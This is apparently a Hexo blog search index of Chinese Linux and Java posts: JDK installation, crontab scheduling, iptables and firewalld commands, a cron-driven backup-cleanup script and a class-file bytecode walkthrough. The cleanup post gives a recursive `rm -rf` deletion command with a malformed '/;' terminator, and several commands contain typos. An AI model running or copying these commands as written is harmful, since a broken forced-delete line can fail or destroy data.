[{"title":"jdk1.8安装","url":"/2018/04/08/jdk1-8%E5%AE%89%E8%A3%85/","content":"<h2 id=\"下载jdk1-8安装包\"><a href=\"#下载jdk1-8安装包\" class=\"headerlink\" title=\"下载jdk1.8安装包\"></a>下载jdk1.8安装包</h2><pre><code>wget ftp://192.168.205.11/Third_party/linux/jdk-8u162-linux-x64.rpm\n</code></pre>\n<h2 id=\"查看已安装jdk\"><a href=\"#查看已安装jdk\" class=\"headerlink\" title=\"查看已安装jdk\"></a>查看已安装jdk</h2><pre><code>rpm -qa|grep jdk\n</code></pre>\n   <img src=\"/images/install_jdk/look.png\" width=\"900px\" height=\"100px\" alt=\"查看已安装jdk\">\n   \n<h3 id=\"若已安装jdk，但其版本不是1-8-0-162，则需将其卸载\"><a href=\"#若已安装jdk，但其版本不是1-8-0-162，则需将其卸载\" class=\"headerlink\" title=\"若已安装jdk，但其版本不是1.8.0_162，则需将其卸载\"></a>若已安装jdk，但其版本不是1.8.0_162，则需将其卸载</h3><pre><code>rpm -e + 查到已安装jdk资源\n</code></pre>\n<h2 id=\"安装jdk\"><a href=\"#安装jdk\" class=\"headerlink\" title=\"安装jdk\"></a>安装jdk</h2><pre><code>rpm -ivh jdk-8u162-linux-x64.rpm\n</code></pre>\n<p>   <img src=\"/images/install_jdk/install.png\" alt=\"安装jdk\"></p>\n<h2 id=\"配置环境变量\"><a href=\"#配置环境变量\" class=\"headerlink\" title=\"配置环境变量\"></a>配置环境变量</h2><pre><code>vi /etc/profile\n</code></pre>\n<h3 id=\"在文件末尾添加如下内容\"><a href=\"#在文件末尾添加如下内容\" class=\"headerlink\" title=\"在文件末尾添加如下内容\"></a>在文件末尾添加如下内容</h3><pre><code>export JAVA_HOME=/usr/java/jdk1.8.0_162\nexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH\nexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JAVA_HOME&#125;/jre/lib:$CLASSPATH\n</code></pre>\n<h3 id=\"1-立即生效：\"><a href=\"#1-立即生效：\" class=\"headerlink\" title=\"(1).立即生效：\"></a>(1).立即生效：</h3><pre><code>source /etc/profile\n</code></pre>\n<h3 id=\"2-再次进入终端生效\"><a href=\"#2-再次进入终端生效\" class=\"headerlink\" title=\"(2).再次进入终端生效\"></a>(2).再次进入终端生效</h3><pre><code>vi /root/.bashrc\n添加source /etc/profile\n</code></pre>\n<h2 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h2><pre><code>java -version\n</code></pre>\n   <img src=\"/images/install_jdk/verify.png\" width=\"900px\" height=\"150px\" alt=\"验证已安装jdk\">","categories":["java"],"tags":["jdk"]},{"title":"crond定时任务二","url":"/2018/07/13/crond%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E4%BA%8C/","content":"<h2 id=\"CentOS安装crontab\"><a href=\"#CentOS安装crontab\" class=\"headerlink\" title=\"CentOS安装crontab:\"></a>CentOS安装crontab:</h2><pre><code>yum install crontabs\n</code></pre>\n<h2 id=\"crond服务操作\"><a href=\"#crond服务操作\" class=\"headerlink\" title=\"crond服务操作\"></a>crond服务操作</h2><pre><code>service crond start     //启动服务\nservice crond stop      //关闭服务\nservice crond restart   //重启服务\nservice crond reload    //重新载入配置\n查看crontab服务状态：service crond status\n手动启动crontab服务：service crond start\n</code></pre>\n<h2 id=\"查看crontab服务是否已设置为开机启动\"><a href=\"#查看crontab服务是否已设置为开机启动\" class=\"headerlink\" title=\"查看crontab服务是否已设置为开机启动\"></a>查看crontab服务是否已设置为开机启动</h2><pre><code>ntsysv\n设置开机启动\nchkconfig crond on\n</code></pre>\n<h2 id=\"定时脚本编写\"><a href=\"#定时脚本编写\" class=\"headerlink\" title=\"定时脚本编写\"></a>定时脚本编写</h2><pre><code>1)、在命令行输入: crontab -e 然后添加相应的任务，wq存盘退出\n  eg: crontab -e \n      */1 * * * *  /home/test.sh    每过一分钟执行一次\n      0 4 * * *  /home/test.sh  每天凌晨四点执行一次\n2)、直接编辑/etc/crontab 文件\nvi /etc/crontab，添加相应的任务(这种方式不推荐)\n</code></pre>\n<h2 id=\"查看当前用户的定时执行任务\"><a href=\"#查看当前用户的定时执行任务\" class=\"headerlink\" title=\"查看当前用户的定时执行任务\"></a>查看当前用户的定时执行任务</h2><pre><code>crontab -l\ncrontab -u root -l 查看指定用户的任务\n</code></pre>\n<h2 id=\"文件格式\"><a href=\"#文件格式\" class=\"headerlink\" title=\"文件格式\"></a>文件格式</h2><pre><code> Minute Hour Day Month DayofWeek CommandPath\n</code></pre>\n<h2 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h2><pre><code>Minute：每个小时的第几分钟执行该任务；取值范围0-59\nHour：每天的第几个小时执行该任务；取值范围0-23\nDay：每月的第几天执行该任务；取值范围1-31\nMonth：每年的第几个月执行该任务；取值范围1-12\nDayOfWeek：每周的第几天执行该任务；取值范围0-6，0表示周末\nCommandPath：指定要执行的程序路径\n</code></pre>\n<h2 id=\"时间格式\"><a href=\"#时间格式\" class=\"headerlink\" title=\"时间格式\"></a>时间格式</h2><pre><code>* ：表示任意的时刻；如小时位 * 则表示每个小时\nn ：表示特定的时刻；如小时位 5 就表示5时\nn,m ：表示特定的几个时刻；如小时位 1,10 就表示1时和10时\nn－m ：表示一个时间段；如小时位 1-5 就表示1到5点\n*/n : 表示每隔多少个时间单位执行一次；如小时位 */1 就表示每隔1个小时执行一次命令，也可以写成 1-23/1\n</code></pre>\n<h2 id=\"调度示例\"><a href=\"#调度示例\" class=\"headerlink\" title=\"调度示例\"></a>调度示例</h2><pre><code>* 1 * * * /opt/script/backup.sh ：从1:0到1:59 每隔1分钟 执行\n15 05 * * * /opt/script/backup.sh ：05:15 执行\n*/10 * * * * /opt/script/backup.sh ：每隔10分 执行\n0 17 * * 1 /opt/script/backup.sh ：每周一的 17:00 执行\n2 8-20/3 * * * /opt/script/backup.sh  8:02,11:02,14:02,17:02,20:02 执行\n30 21 * * * /etc/init.d/nginx restart            //每晚的21:30重启 nginx。\n45 4 1,10,22 * * /etc/init.d/nginx restart        //每月1、 10、22日的4 : 45重启nginx。\n10 1 * * 6,0 /etc/init.d/nginx restart            //每周六、周日的1 : 10重启nginx。\n0,30 18-23 * * * /etc/init.d/nginx restart        //每天18 : 00至23 : 00之间每隔30分钟重启nginx。\n0 23 * * 6 /etc/init.d/nginx restart              //每星期六的11 : 00 pm重启nginx。\n* */1 * * * /etc/init.d/nginx restart            //每一小时重启nginx\n* 23-7/1 * * * /etc/init.d/nginx restart          //晚上11点到早上7点之间，每 隔一小时重启nginx\n0 11 4 * mon-wed /etc/init.d/nginx restart        //每月的4号与每周一到周三 的11点重启nginx\n0 4 1 jan * /etc/init.d/nginx restart            //一月一号的4点重启nginx\n*/30 * * * * /usr/sbin/ntpdate 210.72.145.20      //每半小时同步一下时间\n</code></pre>\n","categories":["linux"],"tags":["crontab"]},{"title":"linux 防火墙命令","url":"/2018/03/09/linux-%E9%98%B2%E7%81%AB%E5%A2%99%E5%91%BD%E4%BB%A4/","content":"<h2 id=\"CentOs6操作防火墙\"><a href=\"#CentOs6操作防火墙\" class=\"headerlink\" title=\"CentOs6操作防火墙:\"></a>CentOs6操作防火墙:</h2><pre><code>配置文件:/etc/sysconfig/iptables\n开启某个端口号有两种方式: 一种是命令方式，一种是修改配置文件方式\n查看防火墙状态: service iptables status\n开启防火墙(重启后永久生效): chkconfig iptables on\n关闭防火墙(重启后永久生效): chkconfig iptables off\n开启防火墙(即时生效，重启后失效): service iptables start\n关闭防火墙(即时生效，重启后失效): service iptables stop\n重启防火墙: service iptables restartd\n查看开启的端口号: service iptables status\n</code></pre>\n<h3 id=\"开启某个端口号\"><a href=\"#开启某个端口号\" class=\"headerlink\" title=\"开启某个端口号\"></a>开启某个端口号</h3><pre><code>开放80端口\niptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\n保存开启的端口号\nservice iptables save\n重新启动防火墙\nservice iptables restart\n</code></pre>\n<h3 id=\"开启某个范围的端口号\"><a href=\"#开启某个范围的端口号\" class=\"headerlink\" title=\"开启某个范围的端口号\"></a>开启某个范围的端口号</h3><pre><code>开启 18881~65534 端口\niptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 18881:65534 -j ACCEPT\n保存开启的端口号\nservice iptables save\n重新启动防火墙\nservice iptables restart\n</code></pre>\n<h3 id=\"通过修改配置文件开启端口号\"><a href=\"#通过修改配置文件开启端口号\" class=\"headerlink\" title=\"通过修改配置文件开启端口号\"></a>通过修改配置文件开启端口号</h3><pre><code>开放80端口\nvi /etc/sysconfig/iptables\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\n启动防火墙\nservice iptables restart\n\n参数说明：\n–A 参数就看成是添加一条规则\n–p 指定是什么协议，我们常用的tcp 协议，当然也有udp，例如53端口的DNS\n–dport 就是目标端口，当数据从外部进入服务器为目标端口\n–j 就是指定是 ACCEPT -接收 或者 DROP 不接收\n查看防火墙对外开放了哪些端口\niptables -L -n\n</code></pre>\n<h2 id=\"CentOs7操作防火墙\"><a href=\"#CentOs7操作防火墙\" class=\"headerlink\" title=\"CentOs7操作防火墙\"></a>CentOs7操作防火墙</h2><pre><code>Centos7默认安装了firewalld，如果没有安装的话，可以使用 yum install firewalld firewalld-config进行安装。\n启动防火墙: systemctl start firewalld\n禁用防火墙: systemctl stop firewalld\n设置开机启动: systemctl enable firewalld\n停止并禁用开机启动: sytemctl disable firewalld\n</code></pre>\n<h2 id=\"查看Linux发行版本\"><a href=\"#查看Linux发行版本\" class=\"headerlink\" title=\"查看Linux发行版本\"></a>查看Linux发行版本</h2><pre><code>uname -a\ncat /etc/redhat-release\n</code></pre>\n","categories":["linux"],"tags":["防火墙"]},{"title":"crond定时任务","url":"/2018/06/08/crond%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","content":"<h2 id=\"crond服务实现定时任务。\"><a href=\"#crond服务实现定时任务。\" class=\"headerlink\" title=\"crond服务实现定时任务。\"></a>crond服务实现定时任务。</h2><pre><code>cron也是在/etc/init.d/中注册从而自启的，启动后它会扫描/var/spool/cron 、/etc/cron.d目录和 /etc/anacrontab文件，扫描到的文件中定义了各种定时任务。\n</code></pre>\n<h2 id=\"cron有两个配置文件，\"><a href=\"#cron有两个配置文件，\" class=\"headerlink\" title=\"cron有两个配置文件，\"></a>cron有两个配置文件，</h2><pre><code>一个是一个全局配置文件（/etc/crontab），是针对系统任务的；\n一组是crontab命令生成的配置文件（/var/spool/cron下的文件），是针对某个用户的.\n定时任务配置到任意一个中都可以。\n</code></pre>\n<h2 id=\"查看用户下的定时任务\"><a href=\"#查看用户下的定时任务\" class=\"headerlink\" title=\"查看用户下的定时任务\"></a>查看用户下的定时任务</h2><pre><code>crontab -l或cat /var/spool/cron/用户名\n</code></pre>\n<h2 id=\"表达式解析\"><a href=\"#表达式解析\" class=\"headerlink\" title=\"表达式解析\"></a>表达式解析</h2><pre><code>min(0-59) \nhour(0-3) \nday of month(1-31) \nmonth(1-12) \nday of week(0-6)\neg: 0 1 * * *\n</code></pre>\n<h2 id=\"启动、停止、重启服务↓\"><a href=\"#启动、停止、重启服务↓\" class=\"headerlink\" title=\"启动、停止、重启服务↓\"></a>启动、停止、重启服务↓</h2><pre><code>systemctl start crond.service\n\nsystemctl stop crond.service\n\nsystemctl restart crond.service\n\nsystemctl reload crond.service  \n</code></pre>\n<h2 id=\"清理垃圾文件\"><a href=\"#清理垃圾文件\" class=\"headerlink\" title=\"清理垃圾文件\"></a>清理垃圾文件</h2><pre><code>linux是一个很能自动产生文件的系统，日志、邮件、备份等。定时删除就显的很方便。\n语句写法：\nfind 对应目录 -mtime +天数 -name &quot;文件名&quot; -exec rm -rf &#123;&#125; /;\neg：\n将/backups目录下所有10天前带&quot;.&quot;的文件删除:\nfind /backups -mtime +10 -name &quot;*.*&quot; -exec rm -rf &#123;&#125; /;\n解析:\nfind：linux的查找命令，用户查找指定条件的文件\n/backups：想要进行清理的任意目录\n-mtime：标准语句写法\n＋10：查找10天前的文件，这里用数字代表天数，＋30表示查找30天前的文件\n&quot;*.*&quot;：希望查找的数据类型，&quot;*.jpg&quot;表示查找扩展名为jpg的所有文件，&quot;*&quot;表示查找所有文件\n-exec：固定写法\nrm -rf：强制删除文件，包括目录\n&#123;&#125; /; ：固定写法，一对大括号+空格+/+;\n可以将这小语句写到一个可执行文件中，再设置cron调度执行，那就可以让系统自动去清理相关文件。\n</code></pre>\n<h2 id=\"定时清理脚本编写\"><a href=\"#定时清理脚本编写\" class=\"headerlink\" title=\"定时清理脚本编写\"></a>定时清理脚本编写</h2><pre><code>新建一个可执行文件clear.sh\n#vi clear\n#!/bin/sh\nfind /u01/backups -mtime +10 -name &quot;*.*&quot; -exec rm -rf &#123;&#125; /;\n赋权\n#chmod +x clear\n将clear.sh文件加入到系统计划任务，到点自动执行\n#crontab -e\n* 2 * * * /usr/local/bin/clear\n这里的设置是每天凌晨2点执行clear脚本进行数据清理\n</code></pre>\n","categories":["linux"],"tags":["crond"]},{"title":"jvm之字节码文件解析","url":"/2019/04/08/jvm%E4%B9%8B%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/","content":"<h1 id=\"字节码解析\"><a href=\"#字节码解析\" class=\"headerlink\" title=\"字节码解析\"></a>字节码解析</h1><p>java文件通过javac编译后将得到一个.class文件,编译后生成class文件,打开后是一堆十六进制数,按字节为单位进行分割后展示如图所示。<br>JVM对于字节码是有规范要求的,规范要求每一个字节码文件都要由十部分按照固定的顺序组成,整体结构如下图所示。</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/class_struct.png\"></p>\n<p>概览:</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/global_scan.png\"></p>\n<h2 id=\"ClassFile结构\"><a href=\"#ClassFile结构\" class=\"headerlink\" title=\"ClassFile结构:\"></a>ClassFile结构:</h2><p>Class文件是一组以8位字节为基础的二进制流，各个数据项目按照严格顺序紧凑排列在Class文件中。<br>所有的16位，32位，64位长度的数据将被构造成2个，4个，8个字节单位来标示。</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/class_file_struct.png\"></p>\n<h2 id=\"class格式说明\"><a href=\"#class格式说明\" class=\"headerlink\" title=\"class格式说明\"></a>class格式说明</h2><ul>\n<li>magic：魔数，魔数的唯一作用是确定这个文件是否为一个能被虚拟机所接受的Class文件。魔数值固定为0xCAFEBABE</li>\n<li>minor_version、major_version： 分别为Class文件的副版本和主版本</li>\n<li>constant_pool_count： 常量池计数器，constant_pool_count的值等于constant_pool表中的成员数加1</li>\n<li>constant_pool[]： 常量池，constant_pool是一种表结构，它包含Class文件结构及其子结构中引用的所有字符串常量、类或接口名、字段名和其它常量。常量池不同于其他，索引从1开始到constant_pool_count -1</li>\n<li>access_flags： 访问标志，access_flags是一种掩码标志，用于表示某个类或者接口的访问权限及基础属性</li>\n<li>this_class： 类索引，this_class的值必须是对constant_pool表中项目的一个有效索引值</li>\n<li>super_class： 父类索引</li>\n<li>interfaces_count： 接口计数器，interfaces_count的值表示当前类或接口的直接父接口数量</li>\n<li>interfaces[]： 接口表，interfaces[]数组中的每个成员的值必须是一个对constant_pool表中项目的一个有效索引值，它的长度为interfaces_count</li>\n<li>fields_count： 字段计数器</li>\n<li>fields[]： 字段表，fields[]数组中的每个成员都必须是一个fields_info结构的数据项</li>\n<li>methods_count： 方法计数器</li>\n<li>methods[]： 方法表，methods[]数组中的每个成员都必须是一个method_info结构的数据项</li>\n<li>attributes_count： 属性计数器</li>\n<li>attributes[]： 属性表，attributes表的每个项的值必须是attribute_info结构</li>\n</ul>\n<h2 id=\"1-文件魔数-凡是Java字节码文件前四个字节一定是cafebabe\"><a href=\"#1-文件魔数-凡是Java字节码文件前四个字节一定是cafebabe\" class=\"headerlink\" title=\"1.文件魔数:凡是Java字节码文件前四个字节一定是cafebabe\"></a>1.文件魔数:凡是Java字节码文件前四个字节一定是cafebabe</h2><p>   <img src=\"/images/jvm_resolve/class_resolve/01.png\"></p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/02.png\"></p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/03.png\"></p>\n<h2 id=\"2-魔数之后四个字节是版本号-class文件次版本号-主版本号\"><a href=\"#2-魔数之后四个字节是版本号-class文件次版本号-主版本号\" class=\"headerlink\" title=\"2.魔数之后四个字节是版本号:class文件次版本号+主版本号\"></a>2.魔数之后四个字节是版本号:class文件次版本号+主版本号</h2><p>   <img src=\"/images/jvm_resolve/class_resolve/04.png\" alt=\"此版本号\"></p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/05.png\" alt=\"主版本号\"></p>\n<h2 id=\"3-常量池\"><a href=\"#3-常量池\" class=\"headerlink\" title=\"3.常量池\"></a>3.常量池</h2><h3 id=\"3-1常量池大小\"><a href=\"#3-1常量池大小\" class=\"headerlink\" title=\"3.1常量池大小\"></a>3.1常量池大小</h3><p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_01.png\" alt=\"常量池大小\"></p>\n<p>   如图:00 88 = 16*8 + 8 = 136 个<br>   通过字节码反汇编器jclasslib反汇编查看常量索引编号从001-135</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_02.png\" alt=\"常量池大小\"></p>\n<p>   其中索引编号000<br>   在制定 class 文件格式规范的时候,设计者将第 0 项常量空了出来,为了满足后面某些指向常量池的索引值的数据在特定情况下需要表达“不引用任何一个常量池项目”的含义,这种情况可用索引值 0 来表示。<br>   需要注意的是,class 文件中只有常量池的容量计数是从 1 开始的,其他的集合类型（注意,这可不是指 java 集合）都是从 0 开始。</p>\n<h3 id=\"3-2-常量格式\"><a href=\"#3-2-常量格式\" class=\"headerlink\" title=\"3.2 常量格式\"></a>3.2 常量格式</h3><p>   在具体翻译一个个常量之前,我们现在了解一下翻译的规则。<br>   class 文件中只有两种数据类型,无符号数和表。<br>   无符号数：基本的数据类型,可选值有 u1、u2、u4、u8,分别代表 1 个字节、2 个字节、4 个字节和 8 个字节。<br>   表：多个无符号数或者其他表作为数据项构成的复合数据类型,所有表都习惯性地以“_info”结尾。<br>   我们再回过头来看,可以发现前面介绍的魔数、版本以及常量池大小,分别可以用 u4（魔数）、u2（次版本号）、u2（主版本号）、u2（常量池大小）来表示。<br>   表的类型有很多,这里贴一张结构表,后面翻译常量的时候会频繁用到：</p>\n<p>   <img src=\"stage01/class_resolve/const_table.png\" alt=\"常量格式\"></p>\n<p>   <img src=\"stage01/class_resolve/const_table_type.png\" alt=\"常量格式\"></p>\n<p>   <img src=\"stage01/class_resolve/const_table_type_02.png\" alt=\"常量格式\"></p>\n<h3 id=\"3-3常量集合\"><a href=\"#3-3常量集合\" class=\"headerlink\" title=\"3.3常量集合\"></a>3.3常量集合</h3><p>   常量池入口指定了常量池的大小为 136,接下来我们一个个读取这些常量。<br>   [0a 00 1d 00 5c ]:0x0a = 10 表示类型是 Methodref,接下来 0x001d =29、0x005c=92,表示指向的是第 29 个和第 92 个常量。我猜这是为了缩减 class 文件的大小,故将相同的常量以地址指向的形式来引用。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_04.png\" alt=\"CONSTANT_Methodref_info\"></p>\n<p>   [09 00 06 00 5e  ]:0x09 = 9 表示类型是 Fieldref,后面 0x0006 和 0x005e 表示分别指向第 6 个和第 94 个常量。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_05.png\" alt=\"CONSTANT_Fieldref_info \"></p>\n<p>   [07 00 61 ]:0x07 = 7 表示类型是 Class,引用指向第 97 个常量。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_06.png\" alt=\"CONSTANT_class_info \"></p>\n<p>   [08 00 70 ]:0x08 = 8 表示类型是字符串类型,引用指向 112</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_07.png\" alt=\"CONSTANT_String_info\"></p>\n<p>   [01 00 04 4e 6f 64 65 ]：0x01 = 1 表示类型是 Utf8,字符串的长度为 0x0004 = 4,故需要读取后面四个字节:4e 6f 64 65。十六进制数字 4e 6f 64 65对应的字符串为Node,这就是定义的变量名。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_pool_08.png\" alt=\"CONSTANT_Utf8_info\"></p>\n<h2 id=\"4-访问标志\"><a href=\"#4-访问标志\" class=\"headerlink\" title=\"4.访问标志:\"></a>4.访问标志:</h2><p>   常量池结束之后,紧接着的两个字节代表访问标志（access_flags）.<br>   访问标志用于识别一些类或者接口层次的访问信息,包括：这个class是类还是接口,是否定义为public类型,是否定义为abstract类型,如果是类的话,是否被声明为final等。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/access_flag.png\" alt=\"访问标志01\"></p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/access_flag_02.png\" alt=\"访问标志02\"></p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/access_flag_03.png\" alt=\"访问标志03\"></p>\n<p>   0x21 的二进制为 100001 ,表示 ACC_SUPER 和 ACC_PUBLIC 为 1。这与代码情况也是一致的,我们是使用 JDK1.8 编译的,并且 MyLinkedList 类确为 public 类型。</p>\n<h2 id=\"5-类索引、父类索引和接口索引集合\"><a href=\"#5-类索引、父类索引和接口索引集合\" class=\"headerlink\" title=\"5.类索引、父类索引和接口索引集合\"></a>5.类索引、父类索引和接口索引集合</h2><h3 id=\"5-1-类索引-00-1c\"><a href=\"#5-1-类索引-00-1c\" class=\"headerlink\" title=\"5.1 类索引[00 1c]\"></a>5.1 类索引[00 1c]</h3><p>  <img src=\"/images/jvm_resolve/class_resolve/class_index_01.png\" alt=\"类索引\"></p>\n<p>  指向常量池28,常量28又指向常量120,值为com/learn/MyLinkedList</p>\n<h3 id=\"5-2-父类索引-00-1d\"><a href=\"#5-2-父类索引-00-1d\" class=\"headerlink\" title=\"5.2 父类索引[00 1d]\"></a>5.2 父类索引[00 1d]</h3><p>  <img src=\"/images/jvm_resolve/class_resolve/class_index_02.png\" alt=\"父类索引\"></p>\n<p>  指向常量池29,常量29又指向常量121,值为com/learn/AbstractGenericList</p>\n<h3 id=\"5-3-接口索引-00-00\"><a href=\"#5-3-接口索引-00-00\" class=\"headerlink\" title=\"5.3 接口索引[00 00]\"></a>5.3 接口索引[00 00]</h3><p>  类索引和父类索引之后,紧接着的两个字节存储的是一个 u2 类型的数据,表示接口计数器。这里是[00,00],长度为 0 表示没有实现接口。</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/class_index_03.png\" alt=\"接口索引\"></p>\n<h2 id=\"6-字段表集合\"><a href=\"#6-字段表集合\" class=\"headerlink\" title=\"6.字段表集合\"></a>6.字段表集合</h2><p>  字段表结构和字段访问标识:</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_struct_01.png\" alt=\"字段表结构\"></p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_access_flag_01.png\" alt=\"字段访问标识\"></p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_access_flag_02.png\" alt=\"字段访问标识\"></p>\n<p>  字段数量:</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_01.png\" alt=\"字段数量\"></p>\n<p>  access_flags: 这里存储的数据是 0x0002,换算成二进制为 10,表示这个字段由 private 修饰。</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_02.png\" alt=\"access_flags\"></p>\n<p>  name_index: 0x0020 换成10进制 32,从第 32 个常量处取得字段名称 first</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_03.png\" alt=\"name_index\"></p>\n<p>  descriptor_index: 0x0021 换成10进制 33,从第 33 个常量处取得字段类型 &lt;Lcom/learn/MyLinkedList$Node;&gt;</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_04.png\" alt=\"descriptor_index\"></p>\n<p>  使用jclasslib反汇编之后:</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_05.png\" alt=\"descriptor_index\"></p>\n<p>  字段类型描述符与其对应类型对照表如下:</p>\n<p>  <img src=\"/images/jvm_resolve/class_resolve/field_type_desc.png\" alt=\"descriptor_index\"></p>\n<h2 id=\"7-属性表集合\"><a href=\"#7-属性表集合\" class=\"headerlink\" title=\"7. 属性表集合\"></a>7. 属性表集合</h2><p> 每个字段最后面,即 descriptor_index 之后,都会跟一个属性表集合。<br> 这里存储的值为 [00,00],表示没有其他的属性。<br> 如果定义的字段为 private int i = 1314;,那么这里就会存在一个属性,指向常量 1314。</p>\n<h2 id=\"8-方法表集合\"><a href=\"#8-方法表集合\" class=\"headerlink\" title=\"8.方法表集合\"></a>8.方法表集合</h2><h3 id=\"8-1-方法数量-0x000e-14个方法-13个方法-一个无参构造方法\"><a href=\"#8-1-方法数量-0x000e-14个方法-13个方法-一个无参构造方法\" class=\"headerlink\" title=\"8.1 方法数量:0x000e:14个方法=13个方法+一个无参构造方法\"></a>8.1 方法数量:0x000e:14个方法=13个方法+一个无参构造方法</h3><p><img src=\"/images/jvm_resolve/class_resolve/method_01.png\" alt=\"方法数量\"></p>\n<p>使用jclasslib反汇编显示:</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_02.png\" alt=\"方法数量\"></p>\n<h3 id=\"8-2-方法表\"><a href=\"#8-2-方法表\" class=\"headerlink\" title=\"8.2 方法表\"></a>8.2 方法表</h3><p>方法访问标识说明:<br>方法表说明:</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_list.png\" alt=\"方法访问标识\"></p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_access_flag_01.png\" alt=\"方法访问标识\"></p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_access_flag_02.png\" alt=\"方法访问标识\"></p>\n<p>access_flag:0x0001 private</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_03.png\" alt=\"access_flag\"></p>\n<p>name_index:0x0024:36</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_04.png\" alt=\"name_index\"></p>\n<p>descriptor_index:0x0025:37</p>\n<p><img src=\"/images/jvm_resolve/class_resolve/method_05.png\" alt=\"descriptor_index\"></p>\n<p>最终结果 public <init> ()V<br>表示这是一个构造方法,()V 表示返回值类型是 void。<br>这与我们平常写 java 代码时的语法有点区别,java 代码中构造方法是没有返回值的,想来是因为构造方法都没有返回值,所以让编译器在编译时处理进而方便开发人员,也略微减小了 java 源文件的大小。</p>\n<h2 id=\"9-属性表集合\"><a href=\"#9-属性表集合\" class=\"headerlink\" title=\"9. 属性表集合\"></a>9. 属性表集合</h2><p>   在字段表和方法表之后都是属性表信息</p>\n<p>   字段表后的属性表如下:[00 01]表示属性个数,[00 22]指向第34个常量,对于每个属性,它的名称需要从常量池中引用一个 Utf8 类型<br>   而属性值的结构是完全自定义的，只需要通过一个 u4 的长度属性来说明属性值所占用的位数即可。这里 [00 00 00 02] 表示，后面 2 个字节[00 23]都是属性值Lcom/learn/MyLinkedList$Node&lt;TE;&gt;;。</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/attri_01.png\" alt=\"字段表后的属性表\"></p>\n<p>   MyLinkedList一共有14个方法,每个方法后都有对应的属性表</p>\n<p>   init方法:</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/method_init.png\"></p>\n<p>   对应jclasslib反汇编:</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/class_lib_init.png\"></p>\n<p>   属性表分析:</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/method_init_attri.png\"></p>\n<p>   init方法后的属性表:[00 01]表示一个属性,[00 26]指向常量表常量38</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/const_38.png\"></p>\n<p>   [00 00 00 41]表示后面65个字节都是属性值:</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/code_info.png\"></p>\n<p>   size方法:</p>\n<p>   <img src=\"stage01/class_resolve/method_size.png\"></p>\n<p>   对应jclasslib反汇编:</p>\n<p>   <img src=\"/images/jvm_resolve/class_resolve/class_lib_size.png\"></p>\n<h2 id=\"10-附加属性集合\"><a href=\"#10-附加属性集合\" class=\"headerlink\" title=\"10.附加属性集合\"></a>10.附加属性集合</h2>","categories":["java"],"tags":["jvm"]},{"title":"入门","url":"/2018/01/07/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"快速创建一个博客\"><a href=\"#快速创建一个博客\" class=\"headerlink\" title=\"快速创建一个博客\"></a>快速创建一个博客</h2><h3 id=\"创建博客\"><a href=\"#创建博客\" class=\"headerlink\" title=\"创建博客\"></a>创建博客</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo new <span class=\"hljs-string\">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo server<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"生成静态资源\"><a href=\"#生成静态资源\" class=\"headerlink\" title=\"生成静态资源\"></a>生成静态资源</h3><figure class=\"highlight 